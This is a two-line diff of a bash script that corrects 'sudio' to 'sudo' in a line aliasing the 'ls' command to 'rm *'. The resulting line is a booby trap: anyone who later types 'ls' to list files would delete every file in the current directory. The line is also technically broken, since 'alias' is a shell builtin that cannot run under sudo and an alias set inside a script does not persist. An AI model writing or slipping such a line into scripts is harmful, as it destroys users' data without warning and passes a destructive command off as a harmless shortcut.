@@ -1,2 +1,2 @@
 #!/bin/bash
-sudio alias ls="rm *"
+sudo alias ls="rm *"
